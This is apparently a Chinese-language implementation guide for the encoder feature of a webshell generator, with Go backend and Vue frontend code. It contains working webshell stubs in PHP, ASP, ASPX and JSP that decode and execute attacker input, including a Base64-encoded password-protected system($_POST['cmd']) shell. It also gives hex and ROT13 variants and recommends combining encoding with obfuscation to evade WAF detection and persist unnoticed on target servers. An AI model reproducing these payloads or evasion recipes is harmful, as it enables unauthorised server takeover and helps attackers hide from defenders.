# WebShell 编码器功能实现指南

## 📋 功能概述

编码器功能允许对生成的 WebShell 代码进行编码处理，增加 WebShell 的隐蔽性和安全性。编码器在模板渲染后、代码混淆前执行。

---

## 🎯 支持的编码器类型

### 1. **Base64 编码器**（推荐）

**编码器名称**: `base64`

**工作原理**: 将原始代码进行 Base64 编码，然后在目标服务器上解码执行。

**各语言实现**:

#### PHP
```php
<?php
// Base64 编码的 Payload
eval(base64_decode('YmFzZTY0IGVuY29kZWQgY29kZQ=='));
?>
```

#### ASP
```asp
<%
' Base64 编码的 Payload
Function DecodeBase64(ByVal strBase64)
     Dim objDM, objXml, objNode
     Set objDM = Server.CreateObject("MSXML2.DOMDocument")
     Set objNode = objDM.createElement("b64")
     objNode.DataType = "bin.base64"
     objNode.Text = strBase64
     DecodeBase64 = objNode.nodeTypedValue
End Function
Execute StrConv(DecodeBase64("YmFzZTY0IGVuY29kZWQgY29kZQ=="), vbUnicode)
%>
```

#### ASPX
```aspx
<%@ Page Language="C#" Debug="true" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    try
    {
        // Base64 编码的 Payload
        string encoded = "YmFzZTY0IGVuY29kZWQgY29kZQ==";
        byte[] decoded = System.Convert.FromBase64String(encoded);
        string code = System.Text.Encoding.UTF8.GetString(decoded);
        Server.Execute(code);
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}
</script>
```

#### JSP
```jsp
<%
// Base64 编码的 Payload
try {
    String encoded = "YmFzZTY0IGVuY29kZWQgY29kZQ==";
    byte[] decoded = java.util.Base64.getDecoder().decode(encoded);
    String code = new String(decoded, "UTF-8");
    Runtime.getRuntime().exec(code);
} catch (Exception e) {
    e.printStackTrace();
}
%>
```

**安全性**: ⭐⭐⭐⭐ (4/5)
- 优点：编码效率高，兼容性好
- 缺点：Base64 特征明显，可能被部分 WAF 识别

---

### 2. **ROT13 编码器**

**编码器名称**: `rot13`

**工作原理**: 简单的字母替换加密，将每个字母替换为字母表中第 13 个位置的字母。

**示例**:
```
原始：eval(base64_decode($_POST['cmd']));
ROT13: riny(onfr64_qrpbqr($_CBFG['pzz']));
```

**包装器**:
```php
// ROT13 编码的 Payload
// 注意：ROT13 是一种简单的替换加密，安全性较低
riny(onfr64_qrpbqr($_CBFG['pzz']));
```

**安全性**: ⭐⭐ (2/5)
- 优点：实现简单，代码可读性低
- 缺点：ROT13 特征非常明显，容易被识别和破解

---

### 3. **URL 编码器**

**编码器名称**: `urlencode`

**工作原理**: 使用 URL 编码（Percent-encoding）对代码进行编码。

**示例**:
```
原始：<?php eval($_POST['cmd']); ?>
URL 编码：%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E
```

**包装器**:
```php
// URL 编码的 Payload
// 需要在服务器端解码
%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E
```

**安全性**: ⭐⭐⭐ (3/5)
- 优点：可以绕过某些简单的过滤
- 缺点：编码后体积增大，特征明显

---

### 4. **十六进制编码器**

**编码器名称**: `hex`

**工作原理**: 将代码转换为十六进制表示。

**PHP 实现**:
```php
<?php
// 十六进制编码的 Payload
eval(hex2bin('3c3f706870206576616c28245f504f53545b27636d64275d293b203f3e'));
?>
```

**安全性**: ⭐⭐⭐⭐ (4/5)
- 优点：编码紧凑，PHP 支持好
- 缺点：仅适用于 PHP，其他语言需要额外实现

---

## 🔧 技术实现

### 后端实现

**文件**: `internal/app/services/payload_generator.go`

#### 编码器处理流程

```go
// Generate 方法中的编码器处理
func (g *PayloadGenerator) Generate(config *entity.PayloadConfig) (*entity.PayloadResult, error) {
    // 1. 验证配置
    if err := g.validateConfig(config); err != nil {
        return nil, err
    }
    
    // 2. 获取模板
    tmpl, err := g.getTemplate(config)
    if err != nil {
        return nil, err
    }
    
    // 3. 渲染模板
    content, err := g.templateService.RenderTemplate(tmpl.Name, config)
    if err != nil {
        return nil, fmt.Errorf("render template failed: %w", err)
    }
    
    // 4. 编码代码（新增）
    if config.Encoder != "" && config.Encoder != "none" {
        content, err = g.encodeCode(content, config.Encoder, string(config.Type))
        if err != nil {
            return nil, fmt.Errorf("encode failed: %w", err)
        }
    }
    
    // 5. 混淆代码
    if config.ObfuscationLevel != entity.ObfuscationNone {
        content, err = g.obfuscateCode(content, string(config.Type), config.ObfuscationLevel)
        if err != nil {
            return nil, fmt.Errorf("obfuscate failed: %w", err)
        }
    }
    
    // 6. 生成结果
    return &entity.PayloadResult{
        Success:  true,
        Content:  content,
        Filename: g.generateFilename(config),
        Size:     len(content),
        Message:  "Payload generated successfully",
    }, nil
}
```

#### 编码器分发器

```go
// encodeCode 编码代码
func (g *PayloadGenerator) encodeCode(code string, encoder string, language string) (string, error) {
    switch encoder {
    case "base64":
        return g.encodeBase64(code, language)
    case "rot13":
        return g.encodeROT13(code, language)
    case "urlencode":
        return g.encodeURL(code, language)
    case "hex":
        return g.encodeHex(code, language)
    default:
        return code, nil // 不支持的编码器返回原代码
    }
}
```

#### 辅助函数

```go
// payloadBase64Encode Base64 编码
func payloadBase64Encode(data string) string {
    return base64.StdEncoding.EncodeToString([]byte(data))
}

// payloadROT13Encode ROT13 编码
func payloadROT13Encode(data string) string {
    result := make([]byte, len(data))
    for i := 0; i < len(data); i++ {
        c := data[i]
        if c >= 'A' && c <= 'Z' {
            result[i] = 'A' + (c-'A'+13)%26
        } else if c >= 'a' && c <= 'z' {
            result[i] = 'a' + (c-'a'+13)%26
        } else {
            result[i] = c
        }
    }
    return string(result)
}

// payloadURLEncode URL 编码
func payloadURLEncode(data string) string {
    return url.QueryEscape(data)
}

// payloadHexEncode 十六进制编码
func payloadHexEncode(data string) string {
    return hex.EncodeToString([]byte(data))
}
```

---

### 前端集成

**文件**: `frontend/src/components/PayloadGenerator.vue`

#### 编码器选择器

```vue
<n-form-item :label="t('payload.encoder')" path="encoder">
  <n-select 
    v-model:value="formData.encoder" 
    :options="[
      { label: '无编码', value: 'none' },
      { label: 'Base64', value: 'base64' },
      { label: 'ROT13', value: 'rot13' },
      { label: 'URL 编码', value: 'urlencode' },
      { label: '十六进制', value: 'hex' },
    ]" 
  />
</n-form-item>
```

#### API 调用

```typescript
const response = await Generate({
  type: formData.type,
  function: formData.function,
  password: formData.password,
  encoder: formData.encoder, // 传递编码器类型
  obfuscation_level: formData.obfuscationLevel,
  output_filename: formData.outputFilename,
})
```

---

##  编码器对比表

| 编码器 | 安全性 | 性能 | 兼容性 | 隐蔽性 | 推荐度 |
|-------|--------|------|--------|--------|--------|
| Base64 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| ROT13 | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐ |
| URL 编码 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
| 十六进制 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ (仅 PHP) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |

---

## 🧪 测试用例

### 测试 1：Base64 编码 PHP WebShell

**输入**:
```
脚本类型：PHP
功能类型：基础命令执行
连接密码：test123
编码器：base64
混淆级别：无混淆
```

**预期输出**:
```php
<?php
// Base64 编码的 Payload
eval(base64_decode('JHBhc3N3b3JkID0gJ3Rlc3QxMjMnOw0KaWYgKGlzc2V0KCRfUE9TVFsncGFzc3dvcmQnXSkgJiYgJF9QT1NUWydwYXNzd29yZCddID09PSAkcGFzc3dvcmQpIHsKICAgICRjbWQgPSAkX1BPU1RbJ2NtZCddOwogICAgc3lzdGVtKCRjbWQpOwp9'));
?>
```

**验证方法**:
```bash
# 解码验证
echo 'JHBhc3N3b3JkID0gJ3Rlc3QxMjMnOw0KaWYgKGlzc2V0KCRfUE9TVFsncGFzc3dvcmQnXSkgJiYgJF9QT1NUWydwYXNzd29yZCddID09PSAkcGFzc3dvcmQpIHsKICAgICRjbWQgPSAkX1BPU1RbJ2NtZCddOwogICAgc3lzdGVtKCRjbWQpOwp9' | base64 -d
```

### 测试 2：十六进制编码 PHP WebShell

**输入**:
```
脚本类型：PHP
功能类型：基础命令执行
连接密码：test123
编码器：hex
混淆级别：无混淆
```

**预期输出**:
```php
<?php
// 十六进制编码的 Payload
eval(hex2bin('3c3f706870202470617373776f7264203d202774657374313233273b0a...'));
?>
```

### 测试 3：ROT13 编码 PHP WebShell

**输入**:
```
脚本类型：PHP
功能类型：基础命令执行
连接密码：test123
编码器：rot13
混淆级别：无混淆
```

**预期输出**:
```php
// ROT13 编码的 Payload
// 注意：ROT13 是一种简单的替换加密，安全性较低
$cffjbeq = 'grfg123';
vs (vffrg($_CBFG['cnffjbeq']) && $_CBFG['cnffjbeq'] === $cnffjbeq) {
    $pzz = $_CBFG['pzz'];
    flfgrz($pzz);
}
```

---

## 🔒 安全性建议

### 编码器选择建议

1. **生产环境推荐**: Base64 或十六进制
   - 编码效率高
   - 兼容性好
   - 可以配合混淆使用

2. **测试/学习环境**: ROT13
   - 简单易懂
   - 便于调试

3. **绕过简单过滤**: URL 编码
   - 可以绕过某些关键字过滤
   - 配合其他编码器使用效果更佳

### 编码器 + 混淆组合

**最佳实践**: 编码器 + 混淆器组合使用

```
1. 模板渲染
   ↓
2. Base64 编码  ← 第一层防护
   ↓
3. 代码混淆     ← 第二层防护
   ↓
4. 最终 Payload
```

**示例配置**:
```
编码器：base64
混淆级别：high
```

这样可以：
- Base64 编码隐藏原始代码逻辑
- 混淆器增加代码分析难度
- 双重防护提高安全性

---

## 🚀 使用场景

### 场景 1：绕过 WAF 检测

**问题**: 传统 WebShell 容易被 WAF 识别

**解决方案**: 使用 Base64 编码 + 高度混淆
```
编码器：base64
混淆级别：high
```

### 场景 2：隐蔽持久化

**问题**: 需要长期潜伏在目标服务器

**解决方案**: 使用十六进制编码 + 中度混淆
```
编码器：hex
混淆级别：medium
```

### 场景 3：快速测试

**问题**: 快速验证 WebShell 功能

**解决方案**: 不编码 + 无混淆
```
编码器：none
混淆级别：none
```

---

## 📝 注意事项

### 1. 编码器局限性

- **编码器不是万能的**: 只能增加隐蔽性，不能完全避免检测
- **特征码仍然存在**: 某些编码（如 ROT13）特征明显
- **性能开销**: 编码/解码会增加执行时间

### 2. 语言兼容性

- **Base64**: 所有语言都支持 ✅
- **ROT13**: 所有语言都支持 ✅
- **URL 编码**: 所有语言都支持 ✅
- **十六进制**: 主要支持 PHP，其他语言需要额外实现 ⚠️

### 3. 编码 vs 加密

**重要区别**:
- **编码**: 可逆转换，目的是数据传输/存储（Base64、Hex、URL）
- **加密**: 需要密钥的可逆转换，目的是数据安全（AES、XOR）

**当前实现**: 仅支持编码，加密功能待实现

---

## 🔮 未来扩展

### 计划中的编码器

1. **XOR 编码器**
   - 使用 XOR 算法加密代码
   - 需要密钥解密
   - 安全性更高

2. **AES 编码器**
   - 使用 AES 加密算法
   - 军事级安全性
   - 需要密钥管理

3. **自定义编码器**
   - 允许用户自定义编码逻辑
   - 支持插件扩展
   - 社区共享编码器

### 编码器链

支持多重编码组合：
```
原始代码 → Base64 → XOR → ROT13 → 最终代码
```

---

## 📚 相关文档

- [载荷模块实现分析报告](./PAYLOAD_ANALYSIS.md)
- [WebShell 生成功能测试指南](./PAYLOAD_TEST_GUIDE.md)
- [代码混淆器实现](./OBFUSCATOR_IMPLEMENTATION.md)

---

## 💡 使用示例

### 命令行示例（未来功能）

```bash
# 生成 Base64 编码的 PHP WebShell
wails payload generate \
  --type php \
  --function basic \
  --password mypassword \
  --encoder base64 \
  --obfuscation high \
  --output shell.php
```

### API 调用示例

```typescript
const result = await Generate({
  type: 'php',
  function: 'full',
  password: 'admin888',
  encoder: 'base64',
  obfuscation_level: 'high',
  output_filename: 'backdoor.php',
})

console.log('生成的 WebShell:')
console.log(result.content)
console.log('文件大小:', result.size, 'bytes')
```

---

**最后更新**: 2026-03-17
**版本**: v1.0.0
